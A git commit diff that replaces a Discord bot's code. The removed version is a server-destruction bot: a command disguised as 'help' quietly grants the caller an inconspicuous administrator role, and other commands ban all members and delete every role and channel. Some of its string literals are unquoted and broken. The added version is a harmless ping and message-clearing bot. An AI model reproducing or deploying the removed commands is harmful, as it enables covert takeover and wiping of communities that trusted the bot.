6064514bc8bdca4909b5db1ecf19b5e9646c7df5
anubhavhirani <backspace7676@gmail.com>
2019-08-01 00:39:43 +0530

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,67 +1,31 @@
-const botSettings = require("./botSettings.json");
-const Discord = require("discord.js");
-const bot = new Discord.Client({disableEveryone: true});
+const Discord = require('discord.js');
+const client = new Discord.Client();
 
-bot.on("ready", async () => {
-    console.log(PossumBot Is Now Activated);
-    //Bot Status
-    bot.user.setActivity(CONFETTI LIVES);
+const PREFIX = '.';
 
-    try {
-        //Generates a invite link in the console...
-    let link = await bot.generateInvite(["ADMINISTRATOR"]);
-    console.log(link);
-    } catch(e) {
-        console.log(e.stack);
-    }
-});
-bot.on("message", async message => { 
-if(message.author.bot) return;
-
-    const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
-      const command = args.shift().toLowerCase();
-
-  //Gives you the admin role and deletes the message.
-  if(command === help) {
-      try {
-    role = await message.guild.createRole({
-     name: ".",
-      color: "#2f3136",
-      permissions: [8]
-    });
-    message.member.addRole(role)
-    message.delete(1000);
-    } catch(e) {
-        console.log(e.stack);
-    }
-   }
-   //Bans everyone and deletes the message.
-   if(command === ban) {
-       try {
-       message.guild.members.forEach(member => {member.ban()});
-       message.delete(1000);
-       } catch(e) {
-    console.log(e.stack);
-       }
-   }
-
-   if(command === roles) {
-       try {
-       message.guild.roles.forEach(roles => {roles.delete()});
-       message.delete(1000);
-       } catch(e) {
-    console.log(e.stack);
-       }
-   }
-
-   if(command === delete) {
-    try {
-    message.guild.channels.forEach(channels => {channels.delete()});
-    message.delete(1000);
-    } catch(e) {
- console.log(e.stack);
-    }
-}
+client.on('ready', () => {
+    console.log('I am ready!');
 });
 
-bot.login(botSettings.token);
+client.on('message', message =>{
+    
+    let args = message.content.substring(PREFIX.length).split(" ");
+
+    switch(args[0]){
+        case 'ping':
+            message.channel.send('pong!');
+            break;
+        case 'youtube':
+            message.channel.send('Youtube.com/ExperienceYT')
+            break;
+        case 'clear' :
+            if(!args[1]) return message.reply('Please mention number of messages to delete')
+            message.channel.bulkDelete(args[1]);
+            break;
+        
+    }
+});
+
+
+// THIS  MUST  BE  THIS  WAY
+client.login(process.env.BOT_TOKEN);
